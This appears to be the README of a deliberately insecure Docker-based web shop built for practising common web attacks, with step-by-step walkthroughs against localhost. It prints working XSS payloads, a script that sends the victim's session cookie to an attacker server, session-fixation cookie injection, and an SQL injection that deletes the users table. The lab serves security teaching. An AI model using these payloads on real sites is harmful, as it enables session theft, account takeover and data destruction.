# Description

An insecure website created to test some of the most common web attacks used these days.

Instructions for how to perform the following attacks are provided:

- SQL injectioon
- Reflected XSS
- Stored XSS
- CSRF
- Session hijacking
- Session fixation
- Clickjacking

Please refer to the second branch for detailed information regarding the preventive methods employed to mitigate those attacks.

## Technical stack

|                     Microservice                     |                         Styling                          |                 Scripting language                 |                   Containerization                    |
| :--------------------------------------------------: | :------------------------------------------------------: | :------------------------------------------------: | :---------------------------------------------------: |
| <img src="./readme-assets/flask.png" height="100px"> | <img src="./readme-assets/bootstrap.png" height="100px"> | <img src="./readme-assets/php.png" height="100px"> | <img src="./readme-assets/docker.png" height="100px"> |

<br>

# Setup phase

#### Presquites

- Docker installed
- Docker deamon running

#### Clone using SSH

```
$ git clone git@github.com:davidlarsson33/Web-shop-under-attack.git
```

#### Change working directory

```
$ cd Web-shop-under-attack
```

#### Set up the project

```
$ docker-compose up
```

#### The following URL:s are available to you now:

&rarr; Victim website: http://localhost/
<br>
&rarr; phpmyadmin: http://localhost:8001/
<br>
&rarr; Attacker's webpage: http://localhost:5000/

# Attack phase

## Reflected XSS attack

1. Go to the login page of the victim website: http://localhost/login
2. Copy & paste the following i the email-adress-section and press submit:

```html
<script>
  alert("Reflected XSS");
</script>
```
<br>

## Stored XSS attack

This attack opens up a major security threat for the website.

1. Go to the login page of the victim website: http://localhost/login
2. Use the attacker's credentials to login:
   - Email: attacker@malicious.com
   - Password: XSS!1234!xss
3. Head over to the reviews-section: http://localhost/reviews
4. Add some malicious javascript as a comment and click submit:

```html
<script>
  console.log("Elon Musk was here");
  console.log("Stealing your cookies in the background...");
</script>
```
Everytime a user visits the reviews-section of the victim website a console log of the above statements will occur (given that js is enabeled). The console.log could be replaced by something more malicious as beeing done in the session hijacking attack below. 

<br>


## Session hijacking

In order for this to work a session token must be hijacked first. There is many ways this can be done. However, I have decided that it would be suitible to make use of the stored XSS attack to get a hold of a user's session token.

### Pre-attack stage:

1. Use chrome and seach for the "ModHeader" extention
2. Add the extention to chrome
3. Enable the extention to be used in icognito mode

### Attack stage: 

1. Go to the login page of the victim website in regular mode: http://localhost/login
2. Use the attacker's credentials to login:
   - Email: attacker@malicious.com
   - Password: XSS!1234!xss
3. Perform a stored XSS attack as outlined above with the following payload:

```html
<script>
  fetch("http://localhost:5000/attacker?cookie=" + document.cookie);
</script>
```

4. Log out the attacker

5. Head over to the login-page: http://localhost/login
6. Login as a user. You could use the following credentials:
    - email: david@gmail.com
    - password: 123AC!asdasdasd
7. Go to the reviews-section @ http://localhost/reviews.php

8. Make sure that the loged in user's session token has been hijacked by looking att the attackers phished_data.txt file.
9. Use ModHeader to append a HTTP header cookie field in every subsequent request. Add this header to each and every HTTP request:
<br>
    Cookie = THE_HIJACKED_COOKIE_VALUE
<br>
<br>
EXAMPLE:
<br>
Cookie = PHPSESSID=97507860b55c55846bf41675b7971e94

```
NOTE: The attacker will send his own session token to himself as a part of the stored XSS attack phase. Make sure you use the victim's session token session during the session hijacking attack.
```

The attacker has now successfully hijacked a user's session and can perform any action that the authenticated user can perform. The attacker can change the user's password, name or email adress. The attacker can even delete the user's account now.

<br>

## Session fixation


### Alternative approach 1 using stored XSS:

1. Open a chrome tab in incognito mode. Note that you are not logged in. Don't close this tab.
2. Navigatre to http://localhost/reviews and then to http://localhost/. Note that you are still not logged in.

3. Head over to the login-page in another reagular tab: http://localhost/login
4. Login as the attacker. You could use the following credentials:
   - Email: attacker@malicious.com
   - Password: XSS!1234!xss
5. Perform a stored XSS attack as outlined above but paste in this in the comment section & press submit:

``` html
<script>document.cookie="THE_ATTACKER'S_SESSION_TOKEN"</script>
```

Where "THE_ATTACKER'S_SESSION_TOKEN" is replaced with the attacker's session token. 

Example: 
``` html
<script>document.cookie="PHPSESSID=af45a8819791c49a4d0320"</script>
```

6. Head over to the incognito tab. 
7. Navigate to http://localhost/pricing. Note that you are NOT logged in.
8. Head over to  http://localhost/reviews. Note that you are NOT logged in.
9. Head over to  http://localhost/pricing (or any other page at the victims website) again. Note that you ARE logged in.

A user visitng the reviews-page will now be logged in as the attacker (given that the user has js enabled). The session fixation attack has been successfully executed.


### Alternative approach 2 using reflected XSS:

1. Head over to the login-page in a reagular tab: http://localhost/login
2. Login as the attacker. You could use the following credentials:
   - Email: attacker@malicious.com
   - Password: XSS!1234!xss

3. Open up another tab in chrome in incognito mode 
4. Notice that you are not loged in incognito mode no matter what page you visit
4. Get a hold of the attacker's session token. This can be done using developer tools. The tooken should look like this:

``` 
PHPSESSID=af45a8819791c49a4d0320
```

5. Trick the user to go to the login page and paste in the following in the username-field:
```html
<script>document.cookie="THE_ATTACKER'S_SESSION_TOKEN"</script>
```

Example:
```html
<script>document.cookie="PHPSESSID=af45a8819791c49a4d0320ca45105472"</script>
```

6. Make the user press submit

The user will no be logged in as the attacker.

<br>

## CSRF

1. Log in as a user at http://localhost/login.php
2. Go the the attacker's URL in another tab: http://localhost:5000/CSRF

<br>

## Clickjacking

1. Go to http://localhost:5000/click-jacker

2. Click anywhere on the webpage

"You will start to download malware" after the click

<br>

## SQL Injection

1. Go to the log in page and paste the following into the username-field:
   '; DELETE FROM users; --

2. Click submit

3. Go to phpAdmin and check the users-table @ http://localhost:8001/

All the users have now been removed from the users table.

<br>

## License

[MIT]('./LICENSE.md')

## Disclamer

[DISCLAIMER]('./DISCLAIMER.md')
